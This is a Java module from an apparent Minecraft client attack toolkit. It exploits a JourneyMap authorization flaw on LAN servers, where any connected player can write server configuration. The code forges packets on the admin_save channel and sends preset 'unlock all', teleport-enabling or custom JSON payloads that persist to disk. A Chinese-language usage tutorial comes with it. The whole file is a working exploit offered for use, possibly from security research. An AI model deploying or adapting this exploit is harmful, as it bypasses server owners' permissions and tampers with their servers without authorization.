package com.redblue.red.modules.journeymap;

import com.redblue.red.core.AttackModule;
import com.redblue.red.core.config.ConfigParam;
import com.redblue.red.util.PacketForge;
import net.minecraft.client.Minecraft;
import net.minecraft.resources.ResourceLocation;
import net.minecraftforge.fml.ModList;

import java.util.List;

/**
 * JM-02: Admin Config Write (LAN server bypass)
 *
 * Verified via javap:
 *   - Channel: journeymap:admin_save (separate SimpleChannel, discriminator=0)
 *   - Wire: writeByte(0) + writeByte(0x2A) + writeInt(type) + writeUtf(dimension) + writeUtf(payload)
 *   - Handler: PacketHandler.onServerAdminSave()
 *
 * Authorization in onServerAdminSave():
 *   1. PermissionsManager.canServerAdmin(player) -- admin list / OP + opAccess
 *   2. OR LoaderHooks.isClient() -- FMLLoader.getDist().isClient()
 *   isClient() returns true on integrated server (LAN), so ANY connected player
 *   can write server config on LAN games.
 *
 * ServerPropertyType enum (verified):
 *   GLOBAL  = id 1 (ordinal 0)
 *   DEFAULT = id 2 (ordinal 1)
 *   DIMENSION = id 3 (ordinal 2)
 *
 * Payload is raw JSON, deserialized via load(String, boolean) then save() to disk.
 * Changes persist across server restarts.
 */
public class JM02_AdminConfigWrite implements AttackModule {

    private static final ResourceLocation CHANNEL =
        new ResourceLocation("journeymap", "admin_save");
    private static final int DISCRIMINATOR = 0;

    private static final String UNLOCK_ALL_PAYLOAD =
        "{\"teleportEnabled\":true,\"radarEnabled\":\"ALL\","
        + "\"surfaceMapping\":\"ALL\",\"caveMapping\":\"ALL\","
        + "\"topoMapping\":\"ALL\",\"journeymapEnabled\":true}";

    private final List<ConfigParam> params = List.of(
        ConfigParam.ofBool("enabled", "启用", false),
        ConfigParam.ofEnum("target_type", "配置类型", "GLOBAL",
            "GLOBAL", "DEFAULT_DIM", "DIMENSION"),
        ConfigParam.ofString("dimension", "维度名 (DIMENSION类型时填写)",
            "minecraft:overworld")
            .visibleWhen("target_type", "DIMENSION"),
        ConfigParam.ofEnum("preset", "预设载荷", "UNLOCK_ALL",
            "UNLOCK_ALL", "ENABLE_TELEPORT", "CUSTOM"),
        ConfigParam.ofString("custom_json", "自定义JSON载荷", "")
            .visibleWhen("preset", "CUSTOM"),
        ConfigParam.ofBool("confirm_danger", "确认: 将覆盖服务器配置并持久化", false)
    );

    @Override public String id() { return "jm02_admin_config_write"; }
    @Override public String name() { return "管理配置覆写"; }
    @Override public String description() { return "LAN服务器任意玩家可覆写JourneyMap服务端配置"; }

    @Override
    public String getTutorial() {
        return "[使用方法]\n"
            + "1. 加入一个LAN(局域网)服务器\n"
            + "2. 选择配置类型: GLOBAL=全局, DEFAULT_DIM=默认维度, DIMENSION=指定维度\n"
            + "3. 选择预设载荷或填写自定义JSON\n"
            + "4. 勾选确认复选框\n"
            + "5. 点击执行\n\n"
            + "[前提条件]\n"
            + "目标必须是LAN服务器(集成服务器), isClient()=true 绕过权限\n"
            + "专用服务器上需要 admin 权限或 dev UUID\n\n"
            + "[预设说明]\n"
            + "UNLOCK_ALL: 启用传送/雷达/地表/洞穴/地形全部功能\n"
            + "ENABLE_TELEPORT: 仅启用传送\n"
            + "CUSTOM: 自定义JSON, 格式参考GlobalProperties字段\n\n"
            + "[危险警告]\n"
            + "配置会持久化到磁盘, 服务器重启后仍然生效";
    }

    @Override
    public boolean isAvailable() {
        return ModList.get().isLoaded("journeymap");
    }

    @Override
    public List<ConfigParam> getConfigParams() { return params; }

    @Override
    public void execute(Minecraft mc) {
        if (mc.player == null) return;

        boolean confirmed = getParam("confirm_danger")
            .map(ConfigParam::getBool).orElse(false);
        if (!confirmed) return;

        String targetType = getParam("target_type")
            .map(ConfigParam::getString).orElse("GLOBAL");
        int typeId;
        switch (targetType) {
            case "DEFAULT_DIM": typeId = 2; break;
            case "DIMENSION":   typeId = 3; break;
            default:            typeId = 1; break; // GLOBAL
        }

        String dimension = getParam("dimension")
            .map(ConfigParam::getString).orElse("");

        String preset = getParam("preset")
            .map(ConfigParam::getString).orElse("UNLOCK_ALL");
        String payload;
        switch (preset) {
            case "ENABLE_TELEPORT":
                payload = "{\"teleportEnabled\":true}";
                break;
            case "CUSTOM":
                payload = getParam("custom_json")
                    .map(ConfigParam::getString).orElse("{}");
                break;
            default: // UNLOCK_ALL
                payload = UNLOCK_ALL_PAYLOAD;
                break;
        }

        final int fType = typeId;
        final String fDim = dimension;
        final String fPayload = payload;

        PacketForge.send(CHANNEL, buf -> {
            buf.writeByte(DISCRIMINATOR);  // SimpleChannel discriminator
            buf.writeByte(0x2A);           // 0x2A marker (from encode)
            buf.writeInt(fType);           // ServerPropertyType id
            buf.writeUtf(fDim);            // dimension string
            buf.writeUtf(fPayload);        // JSON payload
        });
    }
}
